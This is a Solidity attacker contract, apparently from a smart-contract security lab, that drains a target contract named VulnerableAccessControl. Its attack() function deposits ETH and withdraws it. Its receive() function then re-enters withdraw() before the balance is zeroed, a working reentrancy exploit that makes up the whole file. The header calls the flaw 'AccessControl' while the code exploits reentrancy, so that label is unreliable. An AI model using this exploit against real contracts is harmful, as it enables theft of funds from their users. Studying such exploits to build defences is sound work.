// SPDX-License-Identifier: MIT
// Vulnerability: AccessControl
// File: ATTACKER contract — proves the exploit works
// ══════════════════════════════════════════════════
pragma solidity ^0.8.28;

import "./VulnerableAccessControl.sol";

/// @title AttackerAccessControl
/// @notice Exploits the AccessControl vulnerability in VulnerableAccessControl.sol
/// @dev Run the forge test to see this drain the vulnerable contract
contract AttackerAccessControl {

    VulnerableAccessControl public target;
    address public owner;

    constructor(address _target) {
        target = VulnerableAccessControl(_target);
        owner  = msg.sender;
    }

    /// @notice Launch the attack
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    /// @notice Called by the target when it sends ETH — re-enter here
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(); // re-enter before balance is zeroed
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
